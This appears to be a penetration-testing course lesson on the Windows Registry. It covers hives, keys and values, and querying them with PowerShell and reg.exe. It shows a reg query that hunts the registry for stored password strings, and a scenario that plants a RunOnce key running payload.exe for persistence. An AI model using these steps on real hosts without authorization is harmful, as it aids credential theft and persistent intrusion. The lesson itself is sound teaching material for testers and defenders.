<p>At its core, the <code>Registry</code> can be considered a hierarchal tree that contains two essential elements: <code>keys</code> and <code>values</code>. This tree stores all the required information for the operating system and the software installed to run under subtrees (think of them as branches of a tree). This information can be anything from settings to installation directories to specific options and values that determine how everything functions. As Pentesters, the Registry is a great spot to find helpful information, plant persistence, and more. <a href="https://attack.mitre.org/techniques/T1112/">MITRE</a> provides many great examples of what a threat actor can do with access (locally or remotely) to a host&#39;s registry hive.</p>
<h4 id="what-are-keys">What are Keys</h4>
<p><code>Keys</code>, in essence, are containers that represent a specific component of the PC. Keys can contain other keys and values as data. These entries can take many forms, and naming contexts only require that a Key be named using alphanumeric (printable) characters and is not case-sensitive. As a visual example of Keys, if we look at the image below, each folder within the <code>Green rectangle</code> is a Key and contains sub-keys.</p>
<p><strong>Keys (Green)</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/registry.png" alt="text"></p>
<h4 id="registry-key-files">Registry Key Files</h4>
<p>A host systems Registry <code>root keys</code> are stored in several different files and can be accessed from <code>C:\Windows\System32\Config\</code>. Along with these Key files, registry hives are held throughout the host in various other places.</p>
<p><strong>Root Registry Keys</strong></p>
<p>Working with the Registry</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-ChildItem C:\Windows\System32\config\

    Directory: C:\Windows\System32\config

Mode                 LastWriteTime         Length Name
<span class="hljs-comment">----                 -------------         ------ ----</span>
d<span class="hljs-comment">----           12/7/2019  4:14 AM                Journal</span>
d<span class="hljs-comment">----           12/7/2019  4:14 AM                RegBack</span>
d<span class="hljs-comment">----           4/28/2021 11:43 AM                systemprofile</span>
d<span class="hljs-comment">----           9/18/2021 12:22 AM                TxR</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          10/12/2022 10:06 AM         786432 BBI</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---           1/20/2021  5:13 PM          28672 BCD-Template</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          10/18/2022 11:14 AM       38273024 COMPONENTS</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          10/12/2022 10:06 AM        1048576 DEFAULT</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          10/15/2022  9:33 PM       13463552 DRIVERS</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---           1/27/2021  2:54 PM          32768 ELAM</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          10/12/2022 10:06 AM         131072 SAM</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          10/12/2022 10:06 AM          65536 SECURITY</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          10/12/2022 10:06 AM      168034304 SOFTWARE</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          10/12/2022 10:06 AM       29884416 SYSTEM</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          10/12/2022 10:06 AM           1623 VSMIDK</span>
</code></pre>
<p>For a detailed list of all Registry Hives and their supporting files within the OS, we can look <a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives">HERE</a>. Now let&#39;s discuss Values within the Registry.</p>
<h4 id="what-are-values">What Are Values</h4>
<p><code>Values</code> represent data in the form of objects that pertain to that specific Key. These values consist of a name, a type specification, and the required data to identify what it&#39;s for. The image below visually represents <code>Values</code> as the data between the <code>Orange</code> lines. Those values are nested within the Installer key, which is, in turn, inside another key.</p>
<p><strong>Values</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/registry-values.png" alt="text"></p>
<p>We can reference the complete list of Registry Key Values <a href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types">HERE</a>. In all, there are 11 different value types that can be configured.</p>
<h4 id="registry-hives">Registry Hives</h4>
<p>Each Windows host has a set of predefined Registry keys that maintain the host and settings required for use. Below is a breakdown of each hive and what can be found referenced within.</p>
<p><strong>Hive Breakdown</strong></p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Abbreviation</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>HKEY_LOCAL_MACHINE</td>
<td><code>HKLM</code></td>
<td>This subtree contains information about the computer&#39;s <code>physical state</code>, such as hardware and operating system data, bus types, memory, device drivers, and more.</td>
</tr>
<tr>
<td>HKEY_CURRENT_CONFIG</td>
<td><code>HKCC</code></td>
<td>This section contains records for the host&#39;s <code>current hardware profile</code>. (shows the variance between current and default setups) Think of this as a redirection of the <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc739525\(v=ws.10\">HKLM</a>) CurrentControlSet profile key.</td>
</tr>
<tr>
<td>HKEY_CLASSES_ROOT</td>
<td><code>HKCR</code></td>
<td>Filetype information, UI extensions, and backward compatibility settings are defined here.</td>
</tr>
<tr>
<td>HKEY_CURRENT_USER</td>
<td><code>HKCU</code></td>
<td>Value entries here define the specific OS and software settings for each specific user. <code>Roaming profile</code> settings, including user preferences, are stored under HKCU.</td>
</tr>
<tr>
<td>HKEY_USERS</td>
<td><code>HKU</code></td>
<td>The <code>default</code> User profile and current user configuration settings for the local computer are defined under HKU.</td>
</tr>
</tbody>
</table>
<p>There are other predefined keys for the Registry, but they are specific to certain versions and regional settings in Windows. For more information on those entries and Registry keys in general, check out the documentation provided by <a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/predefined-keys">Microsoft</a></p>
<h4 id="why-is-the-information-stored-within-the-registry-important-">Why Is The Information Stored Within The Registry Important?</h4>
<p>As a pentester, the Registry can be a treasure trove of information that can help us further our engagements. Everything from what software is installed, current OS revision, pertinent security settings, control of Defender, and more can be found in the Registry. Can we find all of this information in other places? Yes. But there is no better single point to find all of it and have the ability to make widespread changes to the host simultaneously. From an offensive perspective, the Registry is hard for Defenders to protect. The hives are enormous and filled with hundreds of entries. Finding a singular change or addition among the hives is like hunting for a needle in a haystack (unless they keep solid backups of their configurations and host states). Having a general understanding of the Registry and where key values are within can help us take action quicker and for defenders spot any issues sooner.</p>
<hr>
<h3 id="how-do-we-access-the-information-">How Do We Access the Information?</h3>
<p>From the CLI, we have several options to access the Registry and manage our keys. The first is using <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg">reg.exe</a>. <code>Reg</code> is a dos executable explicitly made for use in managing Registry settings. The second is using the <code>Get-Item</code> and <code>Get-ItemProperty</code> cmdlets to read keys and values. If we wish to make a change, the use of New-ItemProperty will do the trick.</p>
<h4 id="querying-registry-entries">Querying Registry Entries</h4>
<p>We will look at using <code>Get-Item</code> and <code>Get-ChildItem</code> first. Below we can see the output from using Get-Item and piping the result to Select-Object.</p>
<p><strong>Get-Item</strong></p>
<p>Working with the Registry</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-<span class="hljs-keyword">Item</span> -<span class="hljs-keyword">Path</span> Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\<span class="hljs-keyword">Run</span> | <span class="hljs-keyword">Select</span>-Object -ExpandProperty <span class="hljs-keyword">Property</span>  

SecurityHealth
RtkAudUService
WavesSvc
DisplayLinkTrayApp
LogiOptions
Acrobat Assistant <span class="hljs-number">8.0</span>
(default)
Focusrite Notifier
AdobeGCInvoker<span class="hljs-number">-1.0</span>
</code></pre>
<p>It&#39;s a simple output and only shows us the name of the services/applications currently running. If we wished to see each key and object within a hive, we could also use <code>Get-ChildItem</code> with the <code>-Recurse</code> parameter like so:</p>
<p><strong>Recursive Search</strong></p>
<p>Working with the Registry</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; Get-ChildItem -Path HKLM:<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span> -Recurse

Hive: HKEY_LOCAL_MACHINE<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">App</span></span> Paths
&lt;SNIP&gt;
Name                           Property
----                           --------
7zFM.exe                       (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\</span>7-Zip<span class="hljs-tag">\</span>7zFM.exe
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\</span>7-Zip<span class="hljs-tag">\<span class="hljs-name">
</span></span>Acrobat.exe                    (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Adobe</span></span><span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span> DC<span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span><span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span>.exe
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Adobe</span></span><span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span> DC<span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>AcrobatInfo.exe                (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Adobe</span></span><span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span> DC<span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span><span class="hljs-tag">\<span class="hljs-name">AcrobatInfo</span></span>.exe
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Adobe</span></span><span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span> DC<span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>AcroDist.exe                   Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Adobe</span></span><span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span> DC<span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>                               (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Adobe</span></span><span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span> DC<span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span><span class="hljs-tag">\<span class="hljs-name">Acrodist</span></span>.exe
Ahk2Exe.exe                    (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">AutoHotkey</span></span><span class="hljs-tag">\<span class="hljs-name">Compiler</span></span><span class="hljs-tag">\<span class="hljs-name">Ahk</span></span>2Exe.exe
AutoHotkey.exe                 (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">AutoHotkey</span></span><span class="hljs-tag">\<span class="hljs-name">AutoHotkey</span></span>.exe
chrome.exe                     (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Google</span></span><span class="hljs-tag">\<span class="hljs-name">Chrome</span></span><span class="hljs-tag">\<span class="hljs-name">Application</span></span><span class="hljs-tag">\<span class="hljs-name">chrome</span></span>.exe
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Google</span></span><span class="hljs-tag">\<span class="hljs-name">Chrome</span></span><span class="hljs-tag">\<span class="hljs-name">Application</span></span>
cmmgr32.exe                    CmNative          : 2
                               CmstpExtensionDll : C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">cmcfg</span></span>32.dll
CNMNSST.exe                    (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)<span class="hljs-tag">\<span class="hljs-name">Canon</span></span><span class="hljs-tag">\<span class="hljs-name">IJ</span></span> Network Scanner Selector EX<span class="hljs-tag">\<span class="hljs-name">CNMNSST</span></span>.exe
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)<span class="hljs-tag">\<span class="hljs-name">Canon</span></span><span class="hljs-tag">\<span class="hljs-name">IJ</span></span> Network Scanner Selector EX
devenv.exe                     (default) : "C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span> Visual
                               Studio<span class="hljs-tag">\</span>2022<span class="hljs-tag">\<span class="hljs-name">Community</span></span><span class="hljs-tag">\<span class="hljs-name">common</span></span>7<span class="hljs-tag">\<span class="hljs-name">ide</span></span><span class="hljs-tag">\<span class="hljs-name">devenv</span></span>.exe"
dfshim.dll                     UseURL : 1
excel.exe                      (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span> Office<span class="hljs-tag">\<span class="hljs-name">Root</span></span><span class="hljs-tag">\<span class="hljs-name">Office</span></span>16<span class="hljs-tag">\<span class="hljs-name">EXCEL</span></span>.EXE
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span> Office<span class="hljs-tag">\<span class="hljs-name">Root</span></span><span class="hljs-tag">\<span class="hljs-name">Office</span></span>16<span class="hljs-tag">\<span class="hljs-name">
</span></span>                               UseURL    : 1
                               SaveURL   : 1
fsquirt.exe                    DropTarget : {047ea9a0-93bb-415f-a1c3-d7aeb3dd5087}
IEDIAG.EXE                     (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Internet</span></span> Explorer<span class="hljs-tag">\<span class="hljs-name">IEDIAGCMD</span></span>.EXE
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Internet</span></span> Explorer;
IEDIAGCMD.EXE                  (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Internet</span></span> Explorer<span class="hljs-tag">\<span class="hljs-name">IEDIAGCMD</span></span>.EXE
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Internet</span></span> Explorer;
IEXPLORE.EXE                   (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Internet</span></span> Explorer<span class="hljs-tag">\<span class="hljs-name">IEXPLORE</span></span>.EXE
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Internet</span></span> Explorer;
install.exe                    BlockOnTSNonInstallMode : 1
javaws.exe                     (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Java</span></span><span class="hljs-tag">\<span class="hljs-name">jre</span></span>1.8.0_341<span class="hljs-tag">\<span class="hljs-name">bin</span></span><span class="hljs-tag">\<span class="hljs-name">javaws</span></span>.exe
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Java</span></span><span class="hljs-tag">\<span class="hljs-name">jre</span></span>1.8.0_341<span class="hljs-tag">\<span class="hljs-name">bin</span></span>
licensemanagershellext.exe     (default) : C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">licensemanagershellext</span></span>.exe
mip.exe                        (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Common</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span> Shared<span class="hljs-tag">\<span class="hljs-name">Ink</span></span><span class="hljs-tag">\<span class="hljs-name">mip</span></span>.exe
mpc-hc64.exe                   (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)<span class="hljs-tag">\<span class="hljs-name">K</span></span>-Lite Codec Pack<span class="hljs-tag">\<span class="hljs-name">MPC</span></span>-HC64<span class="hljs-tag">\<span class="hljs-name">mpc</span></span>-hc64.exe
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)<span class="hljs-tag">\<span class="hljs-name">K</span></span>-Lite Codec Pack<span class="hljs-tag">\<span class="hljs-name">MPC</span></span>-HC64
mplayer2.exe                   (default) : "C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Windows</span></span> Media Player<span class="hljs-tag">\<span class="hljs-name">wmplayer</span></span>.exe"
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Windows</span></span> Media Player
MSACCESS.EXE                   (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span> Office<span class="hljs-tag">\<span class="hljs-name">Root</span></span><span class="hljs-tag">\<span class="hljs-name">Office</span></span>16<span class="hljs-tag">\<span class="hljs-name">MSACCESS</span></span>.EXE
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span> Office<span class="hljs-tag">\<span class="hljs-name">Root</span></span><span class="hljs-tag">\<span class="hljs-name">Office</span></span>16<span class="hljs-tag">\<span class="hljs-name">
</span></span>                               UseURL    : 1
msedge.exe                     (default) : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Edge</span></span><span class="hljs-tag">\<span class="hljs-name">Application</span></span><span class="hljs-tag">\<span class="hljs-name">msedge</span></span>.exe
                               Path      : C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Edge</span></span><span class="hljs-tag">\<span class="hljs-name">Application</span></span>

    Hive: HKEY_LOCAL_MACHINE<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">App</span></span> Paths<span class="hljs-tag">\<span class="hljs-name">msedge</span></span>.exe

Name                           Property
----                           --------
SupportedProtocols             http  :
                               https :
&lt;SNIP&gt;
</code></pre>
<p>Now we snipped the output because it is expanding and showing each key and associated values within the <code>HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion</code> key. We can make our output easier to read using the <code>Get-ItemProperty</code> cmdlet. Let&#39;s try that same query but with <code>Get-ItemProperty</code>.</p>
<p><strong>Get-ItemProperty</strong></p>
<p>Working with the Registry</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un

SecurityHealth        : C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\S</span>ecurityHealthSystray.exe
RtkAudUService        : "C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\D</span>riverStore<span class="hljs-symbol">\F</span>ileRepository<span class="hljs-symbol">\r</span>ealtekservice.inf_amd64_85cff5320735903
                        d<span class="hljs-symbol">\R</span>tkAudUService64.exe" -background
WavesSvc              : "C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\D</span>riverStore<span class="hljs-symbol">\F</span>ileRepository<span class="hljs-symbol">\w</span>avesapo9de.inf_amd64_d350b8504310bbf5<span class="hljs-symbol">\W</span>
                        avesSvc64.exe" -Jack
DisplayLinkTrayApp    : "C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\D</span>isplayLink Core Software<span class="hljs-symbol">\D</span>isplayLinkTrayApp.exe" -basicMode
LogiOptions           : C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\L</span>ogitech<span class="hljs-symbol">\L</span>ogiOptions<span class="hljs-symbol">\L</span>ogiOptions.exe /noui
Acrobat Assistant 8.0 : "C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\A</span>dobe<span class="hljs-symbol">\A</span>crobat DC<span class="hljs-symbol">\A</span>crobat<span class="hljs-symbol">\A</span>crotray.exe"
(default)             :
Focusrite Notifier    : "C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\F</span>ocusriteusb<span class="hljs-symbol">\F</span>ocusrite Notifier.exe"
AdobeGCInvoker-1.0    : "C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\C</span>ommon Files<span class="hljs-symbol">\A</span>dobe<span class="hljs-symbol">\A</span>dobeGCClient<span class="hljs-symbol">\A</span>GCInvokerUtility.exe"
PSPath                : Microsoft.PowerShell.Core<span class="hljs-symbol">\R</span>egistry::HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urren
                        tVersion<span class="hljs-symbol">\R</span>un
PSParentPath          : Microsoft.PowerShell.Core<span class="hljs-symbol">\R</span>egistry::HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urren
                        tVersion
PSChildName           : Run
PSProvider            : Microsoft.PowerShell.Core<span class="hljs-symbol">\R</span>egistry
</code></pre>
<p>Now let&#39;s break this down. We issued the <code>Get-ItemProperty</code> command, specified out <code>path</code> as looking into the Registry, and specified the key <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>. The output provides us with the <code>name</code> of the services started and the <code>value</code> that was used to run them (the path they were executed from). This Registry key is used to <code>start</code> services/applications when a user <code>logs in</code> to the host. It is a great key to have visibility over and to keep in mind as a penetration tester. There are several versions of this key which we will discuss a little later in this section. Using Get-ItemProperty is much more readable than Get-Item was. When it comes to querying information, we can also use Reg.exe. Let&#39;s take a look at the output from that. We are going to look at a more straightforward key for this example.</p>
<p><strong>Reg.exe</strong></p>
<p>Working with the Registry</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; reg query HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\7</span>-Zip

HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\7</span>-Zip
    Path64    REG_SZ    C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\7</span>-Zip\
    Path    REG_SZ    C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\7</span>-Zip\
</code></pre>
<p>We queried the <code>HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip</code> key with Reg.exe, which provided us with the associated values. We can see that <code>two</code> values are set, <code>Path</code> and <code>Path64</code>, the ValueType is a <code>Reg_SZ</code> value which specifies that it contains a Unicode or ASCII string, and that value is the path to 7-Zip <code>C:\Program Files\7-Zip\</code>.</p>
<h3 id="finding-info-in-the-registry">Finding Info In The Registry</h3>
<p>For us as pentesters and administrators, finding data within the Registry is a must-have skill. This is where <code>Reg.exe</code> really shines for us. We can use it to search for keywords and strings like <code>Password</code> and <code>Username</code> through key and value names or the data contained. Before we put it to use, let&#39;s break down the use of <code>Reg Query</code>. We will look at the command string <code>REG QUERY HKCU /F &quot;password&quot; /t REG_SZ /S /K</code>.</p>
<ul>
<li><code>Reg query</code>: We are calling on Reg.exe and specifying that we want to query data.</li>
<li><code>HKCU</code>: This portion is setting the path to search. In this instance, we are looking in all of HKey_Current_User.</li>
<li><code>/f &quot;password&quot;</code>: /f sets the pattern we are searching for. In this instance, we are looking for &quot;Password&quot;.</li>
<li><code>/t REG_SZ</code>: /t is setting the value type to search. If we do not specify, reg query will search through every type.</li>
<li><code>/s</code>: /s says to search through all subkeys and values recursively.</li>
<li><code>/k</code>: /k narrows it down to only searching through Key names.</li>
</ul>
<p><strong>Searching With Reg Query</strong></p>
<p>Working with the Registry</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt;  REG QUERY HKCU /F "Password" /t REG_SZ /S /K

HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\W</span>inlogon<span class="hljs-symbol">\P</span>asswordExpiryNotification
    NotShownErrorTime    REG_SZ    08::23::24, 2022/10/19
    NotShownErrorReason    REG_SZ    GetPwdResetInfoFailed

End of search: 2 match(es) found.
</code></pre>
<p>Our results from this query could be more exciting, but it&#39;s still worth taking a look and using a similar search for other keywords and phrases like Username, Credentials, and Keys. We could be surprised by what we find. As we can see, querying registry keys and values is relatively easy. What if we want to set a new value or create a new key?</p>
<h4 id="creating-and-modifying-registry-keys-and-values">Creating and Modifying Registry Keys and Values</h4>
<p>When dealing with the modification or creation of <code>new keys and values</code>, we can use standard PowerShell cmdlets like <code>New-Item</code>, <code>Set-Item</code>, <code>New-ItemProperty</code>, and <code>Set-ItemProperty</code> or utilize <code>Reg.exe</code> again to make the changes we need. Let&#39;s try and create a new Registry Key below. For our example, we will create a new test key in the RunOnce hive <code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code> named <code>TestKey</code>. By placing the key and value in RunOnce, after it executes, it will be deleted.</p>
<p>Scenario: We have landed on a host and can add a new registry key for persistence. We need to set a key named <code>TestKey</code> and a value of <code>C:\Users\htb-student\Downloads\payload.exe</code> that tells RunOnce to run our payload we leave on the host the next time the user logs in. This will ensure that if the host restarts or we lose access, the next time the user logs in, we will get a new shell.</p>
<p><strong>New Registry Key</strong></p>
<p>Working with the Registry</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; New-Item -Path HKCU:<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<span class="hljs-symbol">\ </span>-Name TestKey

    Hive: HKCU<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce

Name                           Property
----                           --------
TestKey
</code></pre>
<p>We now have a new key within the RunOnce key. By specifying the <code>-Path</code> parameter, we avoid changing our location in the shell to where we want to add a key in the Registry, letting us work from anywhere as long as we specify the absolute path. Let&#39;s set a Property and a value now.</p>
<p><strong>Set New Registry Item Property</strong></p>
<p>Working with the Registry</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt;  New-ItemProperty -Path HKCU:<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">RunOnce</span></span><span class="hljs-tag">\<span class="hljs-name">TestKey</span></span> -Name  "access" -PropertyType String -Value "C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span>-student<span class="hljs-tag">\<span class="hljs-name">Downloads</span></span><span class="hljs-tag">\<span class="hljs-name">payload</span></span>.exe"

access       : C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span>-student<span class="hljs-tag">\<span class="hljs-name">Downloads</span></span><span class="hljs-tag">\<span class="hljs-name">payload</span></span>.exe
PSPath       : Microsoft.PowerShell.Core<span class="hljs-tag">\<span class="hljs-name">Registry</span></span>::HKEY_CURRENT_USER<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">RunOnce</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>               TestKey
